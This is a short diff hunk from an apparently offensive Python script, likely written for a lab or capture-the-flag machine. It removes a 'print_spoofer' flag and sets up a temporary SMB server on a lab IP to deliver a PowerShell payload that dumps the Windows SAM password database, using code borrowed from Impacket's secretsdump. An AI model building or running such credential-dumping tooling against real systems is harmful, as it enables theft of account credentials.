@@ -6,7 +6,6 @@ from tempsmbserver import TempSMB
 from stolen_from_impacket.secretsdump import dump
 
 local_ip = "10.10.16.101"
-print_spoofer = True
 
 with TempSMB(local_ip=local_ip) as smb:
     sam_dump_payload = SamDumpPowershell(smb)
